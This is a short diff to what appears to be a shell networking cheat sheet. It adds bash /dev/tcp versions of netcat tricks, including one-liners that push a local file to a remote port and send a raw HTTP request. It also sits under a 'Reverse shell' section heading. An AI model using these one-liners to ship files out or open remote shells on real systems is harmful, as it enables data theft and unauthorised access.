@@ -46,9 +46,16 @@ Pointers to the sources of data that the programs are using.
     # send from source
     nc -vn <ip> 6666 < mybin
 
+    # native /dev/tcp way
+    { cat /tmp/toto >&3; cat <&3; } 3<>/dev/tcp/0.0.0.0/42070
+
 # Send a basic GET request to the application on server port
 
-        cat <(echo "GET \file.txt HTTP/1.0" && echo) - | nc 1.1.1.1 2222 -vv
+    # with netcat
+    cat <(echo "GET \file.txt HTTP/1.0" && echo) - | nc 1.1.1.1 2222 -vv
+
+    # native /dev/tcp way
+    { printf >&3 'GET / HTTP/1.0\r\n\r\n'; cat <&3 } 3<>/dev/tcp/www.google.com/80
 
 # Reverse shell: /bin/bash -> /dev/tcp
 
